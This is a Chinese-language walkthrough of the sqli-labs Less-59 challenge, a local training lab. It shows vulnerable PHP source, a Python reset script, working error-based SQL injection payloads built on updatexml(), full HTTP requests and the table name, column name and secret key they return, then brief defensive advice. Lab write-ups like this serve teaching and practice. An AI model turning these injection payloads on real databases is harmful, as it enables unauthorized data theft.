## 题目: Sqli-labs Less-59（Challenge-6）
> 靶场入口：`http://127.0.0.1/sqli-labs/Less-59/`

## 题目描述
Challenge 系列第六关：
```text
The objective of this challenge is to dump the (secret key) from only random table
from Database ('CHALLENGES') in Less than 5 attempts.
```
机会还是 **5 次**，但闭合方式变成了**数字型**：没有任何引号。

## 核心原理与前置分析
源码关键：
```
$times = 5;
$sql = "SELECT * FROM security.users WHERE id=$id LIMIT 0,1";
...
else { print_r(mysql_error()); }   // 报错回显
```

三个特征：
1. **数字型**：`id=$id`，payload 不用引号，直接 `1 and ...`；
2. **报错回显**：`updatexml()` / `extractvalue()` 可用；
3. **5 次预算**：表名 + 列名 + key 刚好 3 次。

另外这关的**页面回显被魔改了**：
```
$unames = array("Dumb","Angelina","Dummy",...);
$pass = array_reverse($unames);
echo 'Your Login name : '. $unames[$row['id']];
```
它不打印真实 `username`，而是用 `id` 去数组里取 —— 所以 UNION 的结果没法直接显示，**必须用报错注入**。
5 次机会的预算：
| 次数 | 用途 |
| --- | --- |
| 1 | 爆表名 |
| 2 | 爆 secret 列名 |
| 3 | 爆 secret key |
| 4‑5 | 容错 / 提交 |

报错注入的 `XPATH syntax error` 最多显示约 31 个字符，而表名（10 位）、列名（`secret_XXXX`，11 位）、secret key（24 位）都**在 31 字符以内**，所以每条都能一次出全，不需要 `substr` 分段。

## 解题思路
1. 请求 `setup-db-challenge.php` 重置数据库；
2. 访问挑战页拿 `challenge` cookie；
3. `1 and updatexml(1,concat(0x7e,database()),1)` 确认报错注入；
4. 依次爆表名、secret 列名、secret key；
5. 提交。

## 解题步骤
### 1. 重置 + 拿 cookie
```
import requests
BASE = "http://127.0.0.1/sqli-labs/Less-59/"
SETUP = "http://127.0.0.1/sqli-labs/sql-connections/setup-db-challenge.php?id=" + BASE
requests.get(SETUP, timeout=30)
s = requests.Session()
s.get(BASE, timeout=15)   # 拿 challenge cookie
```

### 2. 确认报错注入
```
GET /sqli-labs/Less-59/?id=1%20and%20updatexml(1,concat(0x7e,database()),1) HTTP/1.1
Host: 127.0.0.1
```
实测：
```
You have made : 2 of 5 attempts
XPATH syntax error: '~challenges'
```

### 3. 爆表名
```
GET /sqli-labs/Less-59/?id=1%20and%20updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema='challenges')),1) HTTP/1.1
```
实测：
```
XPATH syntax error: '~4twatmaxyj'
```

### 4. 爆 secret 列名
```
GET /sqli-labs/Less-59/?id=1%20and%20updatexml(1,concat(0x7e,(select%20column_name%20from%20information_schema.columns%20where%20table_schema='challenges'%20and%20column_name%20like%20'secret%25')),1) HTTP/1.1
```

实测：
```
XPATH syntax error: '~secret_K985'
```
> 
> 用 `like 'secret%'` 比 `limit 2,1` 稳，不依赖列顺序。

### 5. 爆 secret key
```
GET /sqli-labs/Less-59/?id=1%20and%20updatexml(1,concat(0x7e,(select%20secret_K985%20from%204twatmaxyj)),1) HTTP/1.1
```

实测：
```
XPATH syntax error: '~DIGcWDjY0NIBiWZlK6At3jAN'
```

### 6. 提交
```
POST /sqli-labs/Less-59/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
key=DIGcWDjY0NIBiWZlK6At3jAN&answer_key=Submit
```
实测：出现 `images/Less-54-1.jpg`，通关。

## 踩坑记录
1. **照抄 Less‑58 写单引号**。本关是数字型 `id=$id`，`'` 是多余的，`1' and ...` 会语法错。
2. **想用 UNION 看回显**。页面用 `$unames[$row['id']]` 取数组，不打印真实 username，UNION 结果看不到；**只能报错注入**。
3. **`and 1=2` 判断布尔**。数字型下 `id=1 and 1=2` 返回空，但页面本来就不回显真实数据，布尔判断没意义。
4. **Reset 按钮不跳转**。meta refresh，脚本要直接请求 `setup‑db‑challenge.php`。
5. **成功图是 `Less‑54‑1.jpg`**。源码里写死，别用 `Less‑59‑1.jpg`。
6. **5 次预算**。表名 / 列名 /key 刚好 3 次，别浪费。

## 知识点总结
- **数字型报错注入**：`1 and updatexml(1,concat(0x7e,数据),1)`，不用引号。
- **回显被魔改**：页面用数组映射 `id → username`，真实数据不输出，UNION 失效。
- **31 字符上限**：报错信息有长度限制，短数据一次出，长数据要分段或 `hex()`。
- **5 次预算**：报错注入一步到位，比 UNION 省次数。
- **`like 'secret%'`**：比按列序号查更可靠，不依赖表结构顺序。
- **防御**：预编译；关闭报错回显；限制请求次数。
